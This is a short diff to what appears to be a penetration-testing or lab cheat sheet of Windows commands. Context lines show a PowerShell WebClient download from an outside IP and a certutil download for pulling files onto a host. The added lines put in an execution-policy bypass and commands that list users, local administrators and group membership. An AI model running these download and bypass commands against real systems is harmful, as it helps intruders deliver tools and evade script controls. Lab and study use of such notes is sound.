@@ -644,6 +644,14 @@ powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.31:8
 certutil -urlcache -f URL-link/file.txt file.txt
 Run Powershell as another user:
 runas /user:domain\username "powershell.exe"
+Allow Powershell run script:
+powershell -ep bypass
+Check list of users of local group:
+net user
+Check list of administrators of local users:
+net localgroup administrators
+Check current group:
+whoami /groups
 
 g.) RSA Key - 
 
